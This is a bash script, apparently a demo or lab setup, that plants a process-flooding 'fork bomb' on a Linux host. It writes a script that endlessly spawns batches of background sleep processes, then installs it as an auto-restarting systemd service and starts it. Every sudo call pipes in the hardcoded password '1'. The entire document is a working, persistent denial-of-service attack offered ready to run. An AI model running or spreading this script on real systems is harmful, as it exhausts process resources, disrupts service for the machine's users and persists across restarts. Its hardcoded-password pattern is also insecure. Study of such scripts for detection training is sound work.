Green='\033[0;32m'

echo -e "$Green"
echo "Creating a malicious script of fork bomb"
echo 1 | sudo -S touch /usr/local/bin/fork_bomb.sh

echo 1 | sudo -S tee /usr/local/bin/fork_bomb.sh > /dev/null << EOF
#!/bin/bash

create_child_process() {
    sleep 9999 &
    child_pid=\$!
    echo "Created child process with PID: \$child_pid"
}

trap 'kill \$(jobs -p); exit' SIGINT SIGTERM

while true
do
    for i in \$(seq 1 60);
    do
        create_child_process
    done
    sleep 30
done
EOF

sleep 3

echo ""
echo "Making demo as owner of the malicious script and making script executable"
echo '1' | sudo -S chmod +x /usr/local/bin/fork_bomb.sh
echo 1 | sudo -S chown demo: /usr/local/bin/fork_bomb.sh

sleep 3 

echo ""
echo "Creating a service for the malicious fork bomb script"
echo 1 | sudo -S touch /etc/systemd/system/fork.service

echo 1 | sudo -S tee /etc/systemd/system/fork.service > /dev/null << EOF
[Unit]
Description=Malicious Fork Bomb Service
After=network.target

[Service]
ExecStart=/usr/local/bin/fork_bomb.sh
ExecStop=/bin/kill -s SIGTERM \$MAINPID
Restart=always
User=demo
KillMode=process
Type=simple

[Install]
WantedBy=multi-user.target
EOF

sleep 3

echo ""
echo "Reloading systemd and starting the malicious fork bomb script"
echo 1 | sudo -S systemctl daemon-reload
echo 1 | sudo -S systemctl start fork.service

echo ""
echo "Fork Bomb attack has begun !!!"
